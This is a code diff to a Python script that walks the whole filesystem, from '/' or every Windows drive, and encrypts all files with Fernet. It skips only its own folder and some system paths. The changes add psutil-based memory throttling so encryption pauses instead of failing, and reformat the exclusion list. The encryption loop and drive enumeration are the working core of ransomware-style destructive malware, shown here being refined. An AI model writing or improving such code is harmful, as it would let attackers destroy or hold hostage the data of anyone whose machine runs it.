@@ -7,6 +7,7 @@ import platform
 import logging
 import signal
 import time
+import psutil
 from cryptography.fernet import Fernet
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
@@ -103,6 +104,12 @@ signal.signal(signal.SIGBUS, bus_error_handler)
 def encrypt_files_in_chunks(root_dir, exclude_paths, chunk_size=10):
     all_files = get_all_files(root_dir, exclude_paths)
     for chunk in process_files_in_chunks(all_files, chunk_size):
+        # Dynamic handling of memory and CPU
+        available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total
+        if available_memory < 20:  # If available memory is less than 20%
+            logging.warning("Low memory. Pausing encryption for 5 seconds...")
+            time.sleep(5)
+
         with ThreadPoolExecutor() as executor:
             futures = [executor.submit(encrypt_file, file) for file in chunk]
             for future in as_completed(futures):
@@ -114,7 +121,11 @@ def encrypt_files_in_chunks(root_dir, exclude_paths, chunk_size=10):
 # Main function
 def main():
     root_dirs = ["/"] if platform.system() != "Windows" else [drive + ":\\" for drive in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(drive + ":\\")]
-    exclude_paths = [os.path.abspath(python_env_path), os.path.abspath(os.path.dirname(__file__)), os.path.abspath(nvm_path)]
+    exclude_paths = [
+        os.path.abspath(python_env_path),
+        os.path.abspath(os.path.dirname(__file__)),
+        os.path.abspath(nvm_path)
+    ]
     
     # Dynamically add system paths
     exclude_paths.extend([os.path.abspath(path) for path in system_paths])
@@ -130,8 +141,6 @@ def main():
 
 if __name__ == "__main__":
     main()
-
-
 
 
 
